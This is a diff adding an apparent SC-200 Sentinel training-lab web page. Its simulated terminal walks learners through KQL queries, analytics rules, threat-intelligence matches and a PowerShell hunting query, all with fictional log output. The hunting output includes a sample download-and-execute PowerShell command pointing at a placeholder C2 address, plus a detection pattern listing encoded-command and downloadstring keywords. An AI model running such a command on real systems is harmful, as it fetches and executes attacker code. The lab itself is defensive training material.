@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('sorted');</script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <script src="../../../../components/FirebaseAuth.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sentinel Detection Lab -- SC-200 Chapter 7</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { height: 100vh; overflow: hidden; background: #0c0c0c; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #f5b3b3; display: flex; flex-direction: column; }
+        .lab-header { flex-shrink: 0; padding: 15px 30px; background: rgba(10,6,8,0.95); border-bottom: 1px solid rgba(239,68,68,0.2); display: flex; justify-content: space-between; align-items: center; }
+        .header-left { display: flex; align-items: center; gap: 20px; }
+        .back-btn { padding: 8px 16px; background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3); border-radius: 6px; color: #ef4444; text-decoration: none; font-size: 0.85rem; transition: all 0.3s ease; }
+        .back-btn:hover { background: rgba(239,68,68,0.2); }
+        .lab-title { font-size: 1rem; color: #fde2e2; }
+        .lab-badge { padding: 4px 12px; background: rgba(239,68,68,0.15); border: 1px solid rgba(239,68,68,0.3); border-radius: 12px; font-size: 0.7rem; color: #f87171; letter-spacing: 0.05em; }
+        .lab-badge-ch { padding: 4px 12px; background: rgba(52,211,153,0.15); border: 1px solid rgba(52,211,153,0.3); border-radius: 12px; font-size: 0.7rem; color: #34d399; letter-spacing: 0.05em; }
+        .task-progress { display: flex; align-items: center; gap: 15px; font-size: 0.85rem; color: #7a4040; }
+        .task-count { color: #ef4444; font-weight: 500; }
+        .progress-bar-wrap { width: 140px; height: 6px; background: rgba(239,68,68,0.15); border-radius: 3px; overflow: hidden; }
+        .progress-bar-fill { height: 100%; background: linear-gradient(90deg, #ef4444, #991b1b); border-radius: 3px; width: 0%; transition: width 0.4s ease; }
+        .lab-container { display: grid; grid-template-columns: 320px 1fr; flex: 1; min-height: 0; }
+        .task-panel { background: rgba(10,6,8,0.95); border-right: 1px solid rgba(239,68,68,0.15); overflow-y: auto; padding: 20px; }
+        .task-section { margin-bottom: 25px; }
+        .task-section-title { font-size: 0.68rem; color: #5a2020; letter-spacing: 0.15em; margin-bottom: 12px; text-transform: uppercase; }
+        .task-card { background: rgba(20,10,16,0.8); border: 1px solid rgba(239,68,68,0.15); border-radius: 10px; padding: 14px; margin-bottom: 8px; cursor: pointer; transition: all 0.3s ease; }
+        .task-card:hover { border-color: rgba(239,68,68,0.4); }
+        .task-card.active { border-color: #ef4444; background: rgba(239,68,68,0.1); }
+        .task-card.completed { border-color: rgba(52,211,153,0.4); background: rgba(52,211,153,0.04); }
+        .task-card.completed .task-name::after { content: ' [done]'; font-size: 0.72rem; color: #34d399; font-weight: 400; }
+        .task-number { font-size: 0.68rem; color: #ef4444; margin-bottom: 4px; }
+        .task-name { font-size: 0.9rem; color: #fde2e2; margin-bottom: 4px; }
+        .task-desc { font-size: 0.77rem; color: #7a4040; line-height: 1.45; }
+        .task-desc code { background: rgba(239,68,68,0.15); padding: 1px 5px; border-radius: 3px; font-size: 0.82em; color: #f87171; font-family: 'Consolas', monospace; }
+        .terminal-panel { display: flex; flex-direction: column; background: #0a0a0a; position: relative; overflow: hidden; }
+        .term-toolbar { flex-shrink: 0; padding: 8px 20px; background: rgba(20,10,16,0.9); border-bottom: 1px solid rgba(239,68,68,0.15); display: flex; align-items: center; gap: 12px; }
+        .term-dot { width: 12px; height: 12px; border-radius: 50%; } .term-dot-red { background: #ff5f57; } .term-dot-amber { background: #febc2e; } .term-dot-green { background: #28c840; }
+        .term-title { flex: 1; text-align: center; font-size: 0.8rem; color: #5a3030; font-family: 'Consolas', monospace; }
+        .term-vm-status { display: flex; align-items: center; gap: 6px; font-size: 0.75rem; color: #34d399; }
+        .term-status-dot { width: 7px; height: 7px; background: #34d399; border-radius: 50%; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+        .term-output { flex: 1; overflow-y: auto; padding: 16px 360px 8px 20px; font-family: 'Consolas', monospace; font-size: 0.875rem; line-height: 1.6; }
+        .term-input-row { flex-shrink: 0; display: flex; align-items: center; padding: 8px 360px 12px 20px; border-top: 1px solid rgba(239,68,68,0.1); gap: 0; }
+        .term-prompt-label { font-family: 'Consolas', monospace; font-size: 0.875rem; white-space: nowrap; flex-shrink: 0; }
+        .term-prompt-user { color: #ef4444; } .term-prompt-sep { color: #5a2020; } .term-prompt-path { color: #34d399; } .term-prompt-dollar { color: #fde2e2; margin-right: 6px; }
+        .term-input { flex: 1; background: transparent; border: none; outline: none; color: #fde2e2; font-family: 'Consolas', monospace; font-size: 0.875rem; caret-color: #ef4444; }
+        .term-line { white-space: pre-wrap; word-break: break-all; }
+        .term-line-cmd { color: #f5b3b3; } .term-line-out { color: #a0d4a0; } .term-line-err { color: #f87171; } .term-line-info { color: #f87171; } .term-line-warn { color: #fbbf24; } .term-line-dim { color: #4a2020; } .term-welcome { color: #ef4444; }
+        .term-prompt-span { color: #ef4444; } .term-path-span { color: #34d399; } .term-ps1-sep { color: #5a2020; }
+        .json-key { color: #f87171; } .json-string { color: #86efac; } .json-number { color: #fbbf24; } .json-bool { color: #93c5fd; } .json-null { color: #f87171; }
+        .instructions-panel { position: absolute; top: 20px; right: 20px; width: 320px; background: rgba(10,6,8,0.97); border: 1px solid rgba(239,68,68,0.3); border-radius: 12px; padding: 20px; z-index: 100; box-shadow: 0 10px 30px rgba(0,0,0,0.4); transition: all 0.3s ease; }
+        .instructions-panel.collapsed { width: auto; padding: 10px 14px; cursor: pointer; }
+        .instructions-panel.collapsed .instructions-body { display: none; }
+        .instructions-title { font-size: 1rem; color: #ef4444; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; cursor: pointer; }
+        .instructions-panel.collapsed .instructions-title { margin-bottom: 0; font-size: 0.85rem; }
+        .instructions-toggle { margin-left: auto; width: 28px; height: 28px; background: rgba(239,68,68,0.2); border: 1px solid rgba(239,68,68,0.3); border-radius: 6px; color: #ef4444; font-size: 0.75rem; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .instructions-step { font-size: 0.88rem; color: #f5b3b3; line-height: 1.65; margin-bottom: 14px; }
+        .instructions-step code { background: rgba(239,68,68,0.2); padding: 2px 7px; border-radius: 4px; font-family: 'Consolas', monospace; color: #f87171; font-size: 0.85em; }
+        .instructions-hint { font-size: 0.78rem; color: #5a2020; font-style: italic; margin-top: 14px; padding-top: 14px; border-top: 1px solid rgba(239,68,68,0.15); line-height: 1.5; }
+        .hint-btn { margin-top: 12px; padding: 6px 12px; background: rgba(239,68,68,0.12); border: 1px solid rgba(239,68,68,0.25); border-radius: 5px; color: #ef4444; font-size: 0.75rem; cursor: pointer; font-family: 'Segoe UI', sans-serif; width: 100%; text-align: center; }
+        .hint-command { display: none; margin-top: 10px; padding: 8px 10px; background: rgba(0,0,0,0.4); border: 1px solid rgba(239,68,68,0.25); border-radius: 6px; font-family: 'Consolas', monospace; font-size: 0.78rem; color: #86efac; line-height: 1.55; white-space: pre-wrap; }
+        .hint-command.visible { display: block; }
+        .success-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.82); display: none; align-items: center; justify-content: center; z-index: 2000; }
+        .success-overlay.active { display: flex; }
+        .success-card { background: rgba(10,6,8,0.97); border: 1px solid rgba(52,211,153,0.35); border-radius: 16px; padding: 40px; text-align: center; max-width: 480px; width: 90%; }
+        .success-title { font-size: 1.5rem; color: #34d399; margin-bottom: 10px; }
+        .success-message { color: #f5b3b3; margin-bottom: 25px; line-height: 1.65; font-size: 0.95rem; }
+        .success-btn { padding: 12px 30px; background: linear-gradient(135deg, #ef4444, #991b1b); border: none; border-radius: 8px; color: white; font-size: 0.95rem; cursor: pointer; }
+        @media (max-width: 1024px) { .lab-container { grid-template-columns: 1fr; } .task-panel { display: none; } .term-output, .term-input-row { padding-right: 20px; } .instructions-panel { position: absolute; bottom: 60px; top: auto; right: 10px; left: 10px; width: auto; } }
+    </style>
+</head>
+<body>
+    <header class="lab-header">
+        <div class="header-left">
+            <a href="../index.html" class="back-btn">Exit Lab</a>
+            <span class="lab-title">Sentinel Detection Lab</span>
+            <span class="lab-badge">SC-200</span>
+            <span class="lab-badge-ch">CH.7</span>
+        </div>
+        <div class="task-progress">
+            <span>Progress:</span>
+            <div class="progress-bar-wrap"><div class="progress-bar-fill" id="progressBarFill"></div></div>
+            <span class="task-count" id="taskProgress">0 / 10 Tasks</span>
+        </div>
+    </header>
+    <div class="lab-container">
+        <aside class="task-panel" id="taskPanel"><div class="task-section"><div class="task-section-title">Phase 1 -- KQL Queries</div><div class="task-card" id="task-card-1" data-task="1" onclick="selectTask(1)"><div class="task-number">Task 1</div><div class="task-name">Query Failed Logons</div><div class="task-desc">Run <code>sentinel-kql run failed-logons --timerange 24h</code> to query failed sign-in events from the last 24 hours using KQL.</div></div><div class="task-card" id="task-card-2" data-task="2" onclick="selectTask(2)"><div class="task-number">Task 2</div><div class="task-name">Summarize by Account</div><div class="task-desc">Run <code>sentinel-kql run logon-summary --groupby Account</code> to aggregate failed logon counts per account using the summarize operator.</div></div><div class="task-card" id="task-card-3" data-task="3" onclick="selectTask(3)"><div class="task-number">Task 3</div><div class="task-name">Join with Watchlist</div><div class="task-desc">Run <code>sentinel-kql run vip-logon-check --watchlist VIPUsers</code> to join sign-in data against the VIP users watchlist.</div></div></div><div class="task-section"><div class="task-section-title">Phase 2 -- Analytics Rules</div><div class="task-card" id="task-card-4" data-task="4" onclick="selectTask(4)"><div class="task-number">Task 4</div><div class="task-name">List Active Analytics Rules</div><div class="task-desc">Run <code>sentinel-rules list --status enabled</code> to display all active analytics rules with their type, frequency, and last trigger time.</div></div><div class="task-card" id="task-card-5" data-task="5" onclick="selectTask(5)"><div class="task-number">Task 5</div><div class="task-name">Inspect Scheduled Rule</div><div class="task-desc">Run <code>sentinel-rules show --id AR-1042</code> to view the configuration of a scheduled analytics rule including frequency, lookback, and entity mapping.</div></div><div class="task-card" id="task-card-6" data-task="6" onclick="selectTask(6)"><div class="task-number">Task 6</div><div class="task-name">Inspect NRT Rule</div><div class="task-desc">Run <code>sentinel-rules show --id NRT-0088</code> to view a near-real-time rule and understand its 1-minute execution cycle.</div></div></div><div class="task-section"><div class="task-section-title">Phase 3 -- Threat Intelligence</div><div class="task-card" id="task-card-7" data-task="7" onclick="selectTask(7)"><div class="task-number">Task 7</div><div class="task-name">List TI Indicators</div><div class="task-desc">Run <code>sentinel-ti list --type ip --confidence high</code> to display high-confidence malicious IP indicators from threat intelligence feeds.</div></div><div class="task-card" id="task-card-8" data-task="8" onclick="selectTask(8)"><div class="task-number">Task 8</div><div class="task-name">Check TI Match</div><div class="task-desc">Run <code>sentinel-ti match --indicator 203.0.113.47</code> to check if a specific IP matches any ingested log data.</div></div></div><div class="task-section"><div class="task-section-title">Phase 4 -- Hunting</div><div class="task-card" id="task-card-9" data-task="9" onclick="selectTask(9)"><div class="task-number">Task 9</div><div class="task-name">Run Hunting Query</div><div class="task-desc">Run <code>sentinel-hunt run suspicious-powershell --timerange 7d</code> to execute a hunting query for suspicious PowerShell activity.</div></div><div class="task-card" id="task-card-10" data-task="10" onclick="selectTask(10)"><div class="task-number">Task 10</div><div class="task-name">Bookmark Finding</div><div class="task-desc">Run <code>sentinel-hunt bookmark --query-id HNT-0091 --row 3 --note "Encoded command on DESKTOP-MKT07"</code> to save a hunting result as evidence.</div></div></div></aside>
+        <main class="terminal-panel" id="terminalPanel">
+            <div class="term-toolbar">
+                <div class="term-dot term-dot-red"></div><div class="term-dot term-dot-amber"></div><div class="term-dot term-dot-green"></div>
+                <div class="term-title">socanalyst@sentinel-lab -- bash</div>
+                <div class="term-vm-status"><div class="term-status-dot"></div>Sentinel Lab Online</div>
+            </div>
+            <div class="term-output" id="termOutput"></div>
+            <div class="term-input-row">
+                <span class="term-prompt-label"><span class="term-prompt-user">socanalyst@sentinel-lab</span><span class="term-prompt-sep">:</span><span class="term-prompt-path" id="termPS1Path">~</span><span class="term-prompt-dollar">$</span></span>
+                <input class="term-input" id="termInput" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" aria-label="Terminal input" />
+            </div>
+            <div class="instructions-panel" id="instructionsPanel">
+                <div class="instructions-title" onclick="toggleInstructions()">
+                    <img src="/assets/images/icons/icon-clipboard.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block">
+                    Task Instructions
+                    <button class="instructions-toggle" id="instructionsToggle">&#9660;</button>
+                </div>
+                <div class="instructions-body" id="instructionsBody">
+                    <div class="instructions-step" id="instructionsStep">Type the command in the terminal and press Enter.</div>
+                    <div class="instructions-hint" id="instructionsHint">Hint text loads when you select a task.</div>
+                    <button class="hint-btn" onclick="revealHint()" id="hintBtn">Show command hint</button>
+                    <div class="hint-command" id="hintCommand"></div>
+                </div>
+            </div>
+            <div class="success-overlay" id="successOverlay">
+                <div class="success-card">
+                    <div class="success-title">SC-200 Chapter 7 Lab Complete!</div>
+                    <div class="success-message">You wrote KQL queries with where, summarize, and join operators, inspected scheduled and NRT analytics rules, reviewed threat intelligence indicators and matches, ran a hunting query, and bookmarked evidence. These are the core Sentinel detection workflows for the SC-200 exam.</div>
+                    <button class="success-btn" onclick="finishLab()">Complete Lab</button>
+                </div>
+            </div>
+        </main>
+    </div>
+    <script>
+    (function(){
+        'use strict';
+        var TOTAL_TASKS = 10;
+        var taskDone = {}; for(var i=1;i<=TOTAL_TASKS;i++) taskDone[i]=false;
+        var currentTask = 1;
+        var cmdHistory = [], histIdx = -1;
+        var outputEl, inputEl, ps1PathEl;
+
+        var TASK_INSTRUCTIONS = {1:{step:"Query failed logons from the last 24 hours:\n<code>sentinel-kql run failed-logons --timerange 24h</code>\n\nThis uses the where operator to filter SecurityEvent by EventID 4625.",hint:"The where operator filters rows. Always scope queries with a time filter first for performance.",cmd:"sentinel-kql run failed-logons --timerange 24h"},2:{step:"Aggregate failed logon counts per account:\n<code>sentinel-kql run logon-summary --groupby Account</code>\n\nThis uses summarize count() by Account to find accounts with the most failures.",hint:"The summarize operator aggregates data. Use count(), dcount(), sum(), avg() with a by clause to group results.",cmd:"sentinel-kql run logon-summary --groupby Account"},3:{step:"Join sign-in data against the VIP users watchlist:\n<code>sentinel-kql run vip-logon-check --watchlist VIPUsers</code>\n\nUse _GetWatchlist() to reference watchlists in KQL queries.",hint:"Watchlists bring external business context into detection logic. Upload CSV files and reference them with _GetWatchlist('alias').",cmd:"sentinel-kql run vip-logon-check --watchlist VIPUsers"},4:{step:"List all enabled analytics rules:\n<code>sentinel-rules list --status enabled</code>",hint:"Analytics rules run KQL queries on a schedule. Types: Scheduled, NRT, Fusion, and Microsoft Security (pass-through from other products).",cmd:"sentinel-rules list --status enabled"},5:{step:"Inspect a scheduled analytics rule:\n<code>sentinel-rules show --id AR-1042</code>\n\nReview frequency, lookback, entity mapping, and alert grouping configuration.",hint:"Frequency = how often the rule runs. Lookback = how far back it queries. Lookback must be >= frequency. Entity mapping enables investigation graphs.",cmd:"sentinel-rules show --id AR-1042"},6:{step:"Inspect a near-real-time (NRT) rule:\n<code>sentinel-rules show --id NRT-0088</code>\n\nNRT rules run every minute with no join or union allowed.",hint:"NRT rules have KQL restrictions: no join, no union, single table only. These constraints enable the 1-minute execution cycle.",cmd:"sentinel-rules show --id NRT-0088"},7:{step:"List high-confidence malicious IP indicators:\n<code>sentinel-ti list --type ip --confidence high</code>",hint:"Threat intelligence indicators are imported via STIX/TAXII connectors or the Microsoft Defender TI data connector. Indicators have confidence levels and expiration dates.",cmd:"sentinel-ti list --type ip --confidence high"},8:{step:"Check if an IP matches ingested log data:\n<code>sentinel-ti match --indicator 203.0.113.47</code>",hint:"TI matching rules compare indicators against log tables like SigninLogs, CommonSecurityLog, and AzureActivity. A match creates an alert.",cmd:"sentinel-ti match --indicator 203.0.113.47"},9:{step:"Run a hunting query for suspicious PowerShell:\n<code>sentinel-hunt run suspicious-powershell --timerange 7d</code>",hint:"Hunting is proactive -- you formulate a hypothesis and search for evidence. Hunting queries use the same KQL syntax as analytics rules.",cmd:"sentinel-hunt run suspicious-powershell --timerange 7d"},10:{step:"Bookmark a hunting result as evidence:\n<code>sentinel-hunt bookmark --query-id HNT-0091 --row 3 --note \"Encoded command on DESKTOP-MKT07\"</code>",hint:"Bookmarks save specific query results as evidence artifacts. They can be added to existing incidents or used to create new ones.",cmd:"sentinel-hunt bookmark --query-id HNT-0091 --row 3 --note \"Encoded command on DESKTOP-MKT07\""}};
+
+        var TASK_NAMES = {};
+        TASK_NAMES[1]="Query Failed Logons";
+        TASK_NAMES[2]="Summarize by Account";
+        TASK_NAMES[3]="Join with Watchlist";
+        TASK_NAMES[4]="List Active Analytics Rules";
+        TASK_NAMES[5]="Inspect Scheduled Rule";
+        TASK_NAMES[6]="Inspect NRT Rule";
+        TASK_NAMES[7]="List TI Indicators";
+        TASK_NAMES[8]="Check TI Match";
+        TASK_NAMES[9]="Run Hunting Query";
+        TASK_NAMES[10]="Bookmark Finding";
+
+        var CMD_RESPONSES = {"sentinel-kql run failed-logons --timerange 24h":{"lines":[{"text":"=== KQL Query: Failed Logons (24h) ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  SecurityEvent | where TimeGenerated > ago(24h) | where EventID == 4625","cls":"term-line-warn"},{"text":"  | project TimeGenerated, Computer, Account, LogonType, IpAddress","cls":"term-line-warn"},{"text":"","cls":"term-line-out"},{"text":"  TimeGenerated            Computer        Account              LogonType   IpAddress","cls":"term-line-warn"},{"text":"  2026-04-21 08:14:22      SRV-WEB01       contoso\\svc-deploy   10          10.0.2.45","cls":"term-line-out"},{"text":"  2026-04-21 08:14:23      SRV-WEB01       contoso\\svc-deploy   10          10.0.2.45","cls":"term-line-out"},{"text":"  2026-04-21 09:02:11      DESKTOP-FIN03   contoso\\jpark        2           10.0.1.88","cls":"term-line-out"},{"text":"  2026-04-21 09:31:47      SRV-DC01        contoso\\admin-test   3           203.0.113.47","cls":"term-line-err"},{"text":"  2026-04-21 09:31:48      SRV-DC01        contoso\\admin-test   3           203.0.113.47","cls":"term-line-err"},{"text":"  2026-04-21 09:31:49      SRV-DC01        contoso\\admin-test   3           203.0.113.47","cls":"term-line-err"},{"text":"  ... 247 more rows","cls":"term-line-dim"},{"text":"","cls":"term-line-out"},{"text":"  253 failed logon events in the last 24 hours","cls":"term-line-dim"}],"completesTask":1},"sentinel-kql run logon-summary --groupby Account":{"lines":[{"text":"=== KQL Query: Logon Summary by Account ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  SecurityEvent | where TimeGenerated > ago(24h) | where EventID == 4625","cls":"term-line-warn"},{"text":"  | summarize FailCount=count(), DistinctIPs=dcount(IpAddress) by Account","cls":"term-line-warn"},{"text":"  | sort by FailCount desc","cls":"term-line-warn"},{"text":"","cls":"term-line-out"},{"text":"  Account                  FailCount   DistinctIPs","cls":"term-line-warn"},{"text":"  contoso\\admin-test       87          1             << SUSPICIOUS","cls":"term-line-err"},{"text":"  contoso\\svc-deploy       42          1             (service account lockout)","cls":"term-line-out"},{"text":"  contoso\\jpark            18          3","cls":"term-line-out"},{"text":"  contoso\\mchen            12          2","cls":"term-line-out"},{"text":"  contoso\\asingh            8          1","cls":"term-line-out"},{"text":"  ... 14 more accounts","cls":"term-line-dim"},{"text":"","cls":"term-line-out"},{"text":"  admin-test: 87 failures from 1 IP -- likely brute force attack","cls":"term-line-err"}],"completesTask":2},"sentinel-kql run vip-logon-check --watchlist VIPUsers":{"lines":[{"text":"=== KQL Query: VIP User Logon Check ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  let VIPs = _GetWatchlist('VIPUsers') | project UserPrincipalName;","cls":"term-line-warn"},{"text":"  SigninLogs | where TimeGenerated > ago(24h)","cls":"term-line-warn"},{"text":"  | where UserPrincipalName in (VIPs)","cls":"term-line-warn"},{"text":"  | where ResultType != 0","cls":"term-line-warn"},{"text":"","cls":"term-line-out"},{"text":"  Watchlist 'VIPUsers': 12 entries loaded","cls":"term-line-dim"},{"text":"","cls":"term-line-out"},{"text":"  TimeGenerated            User                    Location     Status","cls":"term-line-warn"},{"text":"  2026-04-21 07:22:10      ceo@contoso.com         US           Success","cls":"term-line-out"},{"text":"  2026-04-21 09:45:33      cfo@contoso.com         BR           Failed (MFA required)","cls":"term-line-err"},{"text":"  2026-04-21 10:12:01      cto@contoso.com         US           Success","cls":"term-line-out"},{"text":"  2026-04-21 11:08:44      cfo@contoso.com         RU           Failed (blocked by CA)","cls":"term-line-err"},{"text":"","cls":"term-line-out"},{"text":"  ALERT: cfo@contoso.com failed sign-ins from Brazil and Russia in 90 minutes","cls":"term-line-err"}],"completesTask":3},"sentinel-rules list --status enabled":{"lines":[{"text":"=== Active Analytics Rules ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  ID          Type         Name                                    Frequency    Last Trigger","cls":"term-line-warn"},{"text":"  AR-1042     Scheduled    Brute Force Against Admin Accounts      5 min        2026-04-21 11:30","cls":"term-line-out"},{"text":"  AR-1055     Scheduled    Impossible Travel Sign-In               1 hour       2026-04-21 11:00","cls":"term-line-out"},{"text":"  AR-1068     Scheduled    TI Map IP to SigninLogs                 1 hour       2026-04-21 11:00","cls":"term-line-out"},{"text":"  NRT-0088    NRT          Mimikatz Process Detection              1 min        2026-04-21 11:31","cls":"term-line-err"},{"text":"  NRT-0091    NRT          Critical Service Stop                   1 min        2026-04-21 11:31","cls":"term-line-out"},{"text":"  FUSION      Fusion       Advanced Multi-Stage Attack Detection   Auto         2026-04-20 16:42","cls":"term-line-out"},{"text":"  AR-1071     Scheduled    Data Exfiltration to Cloud Storage      15 min       2026-04-21 11:15","cls":"term-line-out"},{"text":"  AR-1082     Scheduled    New User Agent in Sign-In Logs          1 hour       2026-04-21 11:00","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  8 rules enabled | 2 NRT | 5 Scheduled | 1 Fusion","cls":"term-line-dim"}],"completesTask":4},"sentinel-rules show --id AR-1042":{"lines":[{"text":"=== Analytics Rule: AR-1042 ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Name:          Brute Force Against Admin Accounts","cls":"term-line-out"},{"text":"  Type:          Scheduled","cls":"term-line-out"},{"text":"  Severity:      High","cls":"term-line-err"},{"text":"  MITRE:         Credential Access (T1110.001 - Password Guessing)","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  Schedule:","cls":"term-line-warn"},{"text":"    Frequency:     Every 5 minutes","cls":"term-line-out"},{"text":"    Lookback:      10 minutes (overlapping window)","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  Entity Mapping:","cls":"term-line-warn"},{"text":"    Account:       TargetAccount","cls":"term-line-out"},{"text":"    IP:            IPAddress","cls":"term-line-out"},{"text":"    Host:          Computer","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  Alert Grouping: Group by Account entity (all alerts for same account = 1 incident)","cls":"term-line-out"},{"text":"  Custom Details: FailCount, SuccessCount, SourceCountry","cls":"term-line-dim"},{"text":"","cls":"term-line-out"},{"text":"  Last 7 days: 3 incidents created | 2 True Positive | 1 Benign Positive","cls":"term-line-dim"}],"completesTask":5},"sentinel-rules show --id NRT-0088":{"lines":[{"text":"=== Analytics Rule: NRT-0088 ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Name:          Mimikatz Process Detection","cls":"term-line-out"},{"text":"  Type:          Near-Real-Time (NRT)","cls":"term-line-err"},{"text":"  Severity:      High","cls":"term-line-err"},{"text":"  MITRE:         Credential Access (T1003 - OS Credential Dumping)","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  Execution:","cls":"term-line-warn"},{"text":"    Cycle:         Every 1 minute (system-managed)","cls":"term-line-out"},{"text":"    Lookback:      Up to 14 minutes (system-managed)","cls":"term-line-out"},{"text":"    Table:         SecurityEvent (single table -- NRT restriction)","cls":"term-line-out"},{"text":"","cls":"term-line-out"},{"text":"  KQL Restrictions:","cls":"term-line-warn"},{"text":"    No join operator allowed","cls":"term-line-err"},{"text":"    No union operator allowed","cls":"term-line-err"},{"text":"    Single table queries only","cls":"term-line-err"},{"text":"    No cross-workspace queries","cls":"term-line-err"},{"text":"","cls":"term-line-out"},{"text":"  Entity Mapping: Account, Host, Process","cls":"term-line-out"},{"text":"  Last 7 days: 1 incident created | 1 True Positive (confirmed Mimikatz on DEV-PC0117)","cls":"term-line-dim"}],"completesTask":6},"sentinel-ti list --type ip --confidence high":{"lines":[{"text":"=== Threat Intelligence: High-Confidence IP Indicators ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Source                  IP Address        Confidence   Valid Until      Tags","cls":"term-line-warn"},{"text":"  Microsoft MDTI          203.0.113.47      95           2026-05-21       C2, APT29","cls":"term-line-err"},{"text":"  TAXII Feed (AlienVault) 198.51.100.22     90           2026-05-15       Phishing","cls":"term-line-err"},{"text":"  Microsoft MDTI          192.0.2.88        92           2026-05-18       Ransomware","cls":"term-line-err"},{"text":"  TAXII Feed (AlienVault) 203.0.113.99      88           2026-04-30       Scanner","cls":"term-line-warn"},{"text":"  Manual Upload           10.255.0.1        85           2026-06-01       Internal IoC","cls":"term-line-warn"},{"text":"","cls":"term-line-out"},{"text":"  5 high-confidence IP indicators active","cls":"term-line-dim"},{"text":"  Ingested via: MDTI connector (auto) + TAXII 2.1 feed + manual upload","cls":"term-line-dim"}],"completesTask":7},"sentinel-ti match --indicator 203.0.113.47":{"lines":[{"text":"=== TI Match: 203.0.113.47 ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Indicator: 203.0.113.47 | Source: Microsoft MDTI | Tags: C2, APT29","cls":"term-line-err"},{"text":"","cls":"term-line-out"},{"text":"  Matched Log Tables:","cls":"term-line-warn"},{"text":"    SigninLogs         3 matches     2026-04-21 09:31 - 09:32 UTC","cls":"term-line-err"},{"text":"    SecurityEvent      87 matches    2026-04-21 09:31 - 10:45 UTC (failed logons)","cls":"term-line-err"},{"text":"    CommonSecurityLog  12 matches    2026-04-21 09:30 - 10:50 UTC (firewall)","cls":"term-line-warn"},{"text":"","cls":"term-line-out"},{"text":"  Affected Entities:","cls":"term-line-warn"},{"text":"    Account: contoso\\admin-test (87 failed logon attempts from this IP)","cls":"term-line-err"},{"text":"    Host:    SRV-DC01 (targeted)","cls":"term-line-err"},{"text":"","cls":"term-line-out"},{"text":"  ALERT CREATED: TI-Match-2026-04-21-0931 (High severity)","cls":"term-line-err"},{"text":"  This IP is associated with APT29 command-and-control infrastructure","cls":"term-line-warn"}],"completesTask":8},"sentinel-hunt run suspicious-powershell --timerange 7d":{"lines":[{"text":"=== Hunting Query: Suspicious PowerShell (7 days) ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  SecurityEvent | where TimeGenerated > ago(7d)","cls":"term-line-warn"},{"text":"  | where EventID == 4688","cls":"term-line-warn"},{"text":"  | where Process == \"powershell.exe\" or Process == \"pwsh.exe\"","cls":"term-line-warn"},{"text":"  | where CommandLine has_any (\"-enc\", \"-encodedcommand\", \"downloadstring\", \"invoke-expression\")","cls":"term-line-warn"},{"text":"","cls":"term-line-out"},{"text":"  Row  TimeGenerated          Computer         Account             CommandLine","cls":"term-line-warn"},{"text":"  1    2026-04-17 14:22:10    SRV-BUILD01      contoso\\svc-ci      powershell -enc aQBtAH...  (CI pipeline)","cls":"term-line-out"},{"text":"  2    2026-04-19 03:11:47    SRV-WEB01        contoso\\svc-deploy  pwsh -encodedcommand ... (deploy script)","cls":"term-line-out"},{"text":"  3    2026-04-21 09:38:22    DESKTOP-MKT07    contoso\\rjones      powershell -enc SQBuAH...  << SUSPICIOUS","cls":"term-line-err"},{"text":"  4    2026-04-21 09:42:15    DESKTOP-MKT07    contoso\\rjones      powershell downloadstring http://203.0.113.47/s.ps1","cls":"term-line-err"},{"text":"","cls":"term-line-out"},{"text":"  4 results | 2 known-safe (CI/deploy) | 2 suspicious (DESKTOP-MKT07)","cls":"term-line-err"},{"text":"  Row 3-4: Encoded command + download from known C2 IP on user workstation","cls":"term-line-warn"}],"completesTask":9},"sentinel-hunt bookmark --query-id HNT-0091 --row 3 --note \"Encoded command on DESKTOP-MKT07\"":{"lines":[{"text":"=== Hunting Bookmark Created ===","cls":"term-line-info"},{"text":"","cls":"term-line-out"},{"text":"  Bookmark ID:    BK-2026-04-21-0001","cls":"term-line-out"},{"text":"  Query:          HNT-0091 (Suspicious PowerShell)","cls":"term-line-out"},{"text":"  Row:            3","cls":"term-line-out"},{"text":"  Analyst Note:   Encoded command on DESKTOP-MKT07","cls":"term-line-warn"},{"text":"","cls":"term-line-out"},{"text":"  Captured Data:","cls":"term-line-warn"},{"text":"    Time:     2026-04-21 09:38:22","cls":"term-line-out"},{"text":"    Host:     DESKTOP-MKT07","cls":"term-line-out"},{"text":"    Account:  contoso\\rjones","cls":"term-line-out"},{"text":"    Command:  powershell -enc SQBuAH...","cls":"term-line-err"},{"text":"","cls":"term-line-out"},{"text":"  Bookmark saved. Can be added to incident or promoted to new incident.","cls":"term-line-dim"},{"text":"  Entities mapped: Account (rjones), Host (DESKTOP-MKT07)","cls":"term-line-dim"}],"completesTask":10}};
+
+        function escH(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
